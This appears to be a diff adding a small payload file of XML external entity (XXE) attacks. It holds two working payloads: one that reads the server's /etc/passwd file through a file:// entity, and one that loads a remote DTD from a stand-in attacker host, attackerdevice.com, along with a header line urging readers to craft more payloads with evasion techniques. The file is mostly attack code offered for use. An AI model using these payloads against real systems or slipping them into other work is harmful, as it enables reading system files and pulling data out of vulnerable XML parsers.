@@ -1,0 +1,22 @@
+## You can generate more payloads   using these payload examples based on your imaginery and using evasion techniques 😄 ##
+// Simple XML external entity attack payload, This payload read server'spasswd file and put var1  and outputs via &var1 
+
+<?xml version="1.0"?>
+<!DOCTYPE  TEST [  
+<!ELEMENT TEST ANY >  
+<!ENTITY  var1 SYSTEM "file:///etc/passwd" >]>  
+<TEST>&var1;</TEST>
+
+
+/* This XEE attack  uses remote DTD definition  via HTTP request to the remote server (Attack to Retrieve HTTP Data)
+ First, you can create a harmful.dtd file in attackerdevice.com  server */
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE Test [  
+<!ELEMENT Test ANY >  
+<!ENTITY var2 SYSTEM "http://attackerdevice.com/harmful.dtd" >]>  
+<Test>&var2;</Test>
+
+
+
+
